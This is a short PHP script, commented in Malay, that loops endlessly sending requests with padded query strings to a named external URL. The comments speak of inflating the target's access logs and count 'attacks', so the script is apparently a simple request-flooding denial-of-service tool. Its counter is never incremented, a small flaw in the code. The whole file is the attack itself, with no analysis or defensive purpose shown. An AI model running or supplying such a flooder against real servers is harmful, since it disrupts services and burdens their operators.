<?php
//Boleh dibesarkan
$packet = "1234567890abcdefghijklmnopzrstuvwxyz";

//Jumlah lebih kurang 245-300 byte dalam access logs
$url = "https://ms5hf7.cn/j/ntb.php?c=$packet&m=$packet&tg=$packet&ln=$packet&vb=$packet&_t=$packet";

$n = 1;

while(true){
	$res = file_get_contents($url);
	
	if(!$res){
		echo "Terputus pada: " . $n . " serangan";
	}
}